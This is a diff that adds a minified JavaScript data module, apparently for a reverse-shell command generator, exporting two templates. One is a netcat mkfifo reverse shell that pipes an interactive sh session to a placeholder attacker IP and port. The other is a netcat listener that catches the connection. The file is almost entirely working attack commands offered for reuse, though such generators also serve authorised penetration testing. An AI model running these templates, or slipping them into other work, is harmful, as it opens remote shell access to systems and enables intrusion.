@@ -1,0 +1,1 @@
+const t=[{title:"Netcat mkfifo reverse shell",template:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",description:"Creates a named pipe for stdin/stdout, then uses nc to connect back for an interactive shell."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],e={commands:t};export{t as commands,e as default};
